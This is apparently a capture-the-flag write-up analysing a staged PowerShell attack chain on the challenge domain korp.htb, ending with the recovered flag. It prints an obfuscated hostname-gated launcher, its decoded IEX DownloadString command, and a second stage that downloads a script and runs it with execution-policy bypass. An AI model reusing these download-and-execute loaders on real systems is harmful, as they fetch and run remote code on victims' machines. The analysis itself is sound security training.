# Thorin's Amulet

Garrick and Thorin’s visit to Stonehelm took an unexpected turn when Thorin’s old rival, Bron Ironfist, challenged him to a forging contest. In the end Thorin won the contest with a beautifully engineered clockwork amulet but the victory was marred by an intrusion. Saboteurs stole the amulet and left behind some tracks. Because of that it was possible to retrieve the malicious artifact that was used to start the attack. Can you analyze it and reconstruct what happened? Note: make sure that domain `korp.htb` resolves to your docker instance IP and also consider the assigned port to interact with the service.

-----

We are given an `artifact.ps1` script which only executes a Base64-encoded string if the hostname matches `WORKSTATION-DM-0043`:

```powershell
function qt4PO {
    if ($env:COMPUTERNAME -ne "WORKSTATION-DM-0043") {
        exit
    }
    powershell.exe -NoProfile -NonInteractive -EncodedCommand "SUVYIChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCJodHRwOi8va29ycC5odGIvdXBkYXRlIik="
}
qt4PO
```

The string decodes to an `IEX`/`Invoke-Expression` command which downloads an `update` file from external domain:

```powershell
IEX (New-Object Net.WebClient).DownloadString("http://korp.htb/update")
```

Setting the `/etc/hosts` entry of `korp.htb` to our given IP and port, we receive an additional `update.ps1` script:

```powershell
function aqFVaq {
    Invoke-WebRequest -Uri "http://korp.htb/a541a" -Headers @{"X-ST4G3R-KEY"="5337d322906ff18afedc1edc191d325d"} -Method GET -OutFile a541a.ps1
    powershell.exe -exec Bypass -File "a541a.ps1"
}
aqFVaq
```

The `aqFVaq` function makes a web request via `Invoke-WebRequest` to the same domain specifying headers, downloading and executing an additional PS1 script, `a541a.ps1`.

Replicating this with `curl` retrieves the file:

```
curl -H "X-ST4G3R-KEY: 5337d322906ff18afedc1edc191d325d" -o a541a.ps1 http://korp.htb:[PORT]/a541a
```

```powershell
$a35 = "4854427b37683052314e5f4834355f346c573459355f3833336e5f344e5f39723334375f314e56336e3730727d"
($a35-split"(..)"|?{$_}|%{[char][convert]::ToInt16($_,16)}) -join ""
```

The string is encoded in hex which decodes to the flag:

```
HTB{7h0R1N_H45_4lW4Y5_833n_4N_9r347_1NV3n70r}
```